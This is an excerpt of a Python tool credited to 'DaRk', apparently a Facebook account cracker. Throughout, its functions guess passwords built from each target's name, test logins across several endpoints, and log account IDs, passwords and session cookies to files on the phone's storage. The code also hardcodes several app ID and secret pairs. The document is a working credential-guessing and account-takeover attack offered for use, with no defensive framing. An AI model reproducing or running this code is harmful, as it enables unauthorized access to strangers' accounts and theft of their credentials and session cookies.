...
\t   \033[31;42m DaRk\33[0;m\__😘😈
{40*"="} \x1b[1;97m
  [\x1b[1;95m+\x1b[1;97m] AUTHOR : DaRk
  [\x1b[1;95m+\x1b[1;97m] GITHUB : Mdsheikhforid     
  [\x1b[1;95m+\x1b[1;97m] FACEBOOK : Md Forid
  [\x1b[1;95m+\x1b[1;97m] YOU TUBE : No                    
...
def normalfl(id,psd,name,tid):
	...
	try:
		...
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}DaRk-M1{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		...
		if 'c_user' in logx:
			...
			print(f'\r\r{G}[DaRk-OK] {id} | {psw}{W}')
			ok.append(id)
			if 'y' in cokix:
				print(f'\r  {BG}[{W}Cookie{BG}]{E} : {G}{kuki}{W}');print(f"{W}{40*'-'}{E}")
			open('/sdcard/DaRk-FILE-OK.txt', 'a').write(id+' | '+psw+'  ------------>>>'+coki+"\n")
			break
		elif twfx in str(logx):
			print(f'\r\r{S}[DaRk-2F] {id} | {psw}{W}')
			open('/sdcard/DaRk-FILE-2F.txt', 'a').write(id+' | '+psw+"\n")
			twf.append(id)
			break
			...
			if 'y' in cpx:
				print(f'\r\r{R}[DaRk-CP] {id} | {psw}{W}')
			open('/sdcard/DaRk-FILE-CP.txt', 'a').write(id+' | '+psw+"\n")
			cp.append(id)
			break
		else:continue
	lop+=1
def graphfl(id,psd,name,tid):
	...
	try:
		...
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}DaRk-M2{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
		ua=ua1()
...
def graphfl2(id,psd,name,tid):
	...
	try:
		...
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}DaRk-M3{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
		ua=ua3()
		apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
		...
		if 'Please Confirm Email' in logx:
			...
			if 'y' in cpx:
				print(f'\r\r{R}[DaRk-CP] {id} | {psw}{W}');print(ua)
			open('/sdcard/DaRk-FILE-CP.txt', 'a').write(id+' | '+psw+"\n")
			cp.append(id)
			break
		else:continue
...
def nrmlrm(id,psd,tid,mytd):
	...
	for psw in psd:
		...
		if 'c_user' in lcki:
			...
			iid = coki[151:166]
			print(f'\r\r{G}[DaRk-OK] {iid} | {psw}{W}')
			if 'y' in cokix:
				print(f'\r\r{R}[{G}Cookie{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			ok.append(id)
			open('/sdcard/DaRk-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			break
		elif 'checkpoint' in lcki:
			coki=";".join([key+"="+value for key,value in session.Cookie.get_dict().items()])
			iid = coki[141:156]
			if 'y' in cpx:
				print(f'\r\r{R}[DaRk-CP] {iid} | {psw}{W}')
			cp.append(id)
			open('/sdcard/DaRk-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
def graphrm(id,psd,tid):
	...
	for psw in psd:
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{S}[DaRk-2F] {iid} | {psw}{W}')
			open('/sdcard/DaRk-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
...
def apirm(id,psd,tid):
	...
	for psw in psd:
		...
		if 'session_key' in jsn:
			print(f'\r\r{G}[DaRk-OK] {iid} | {psw}{W}')
			ok.append(id);open('/sdcard/DaRk-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'\n') #+'  ------------>>>'+coki+"\n")
			break
		elif 'www.facebook.com' in jsn['error_msg']:
			if 'y' in cpx:
				print(f'\r\r{R}[DaRk-CP] {id} | {psw}{W}')
			cp.append(id)
			open('/sdcard/DaRk-CP.txt', 'a').write(id+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
##################
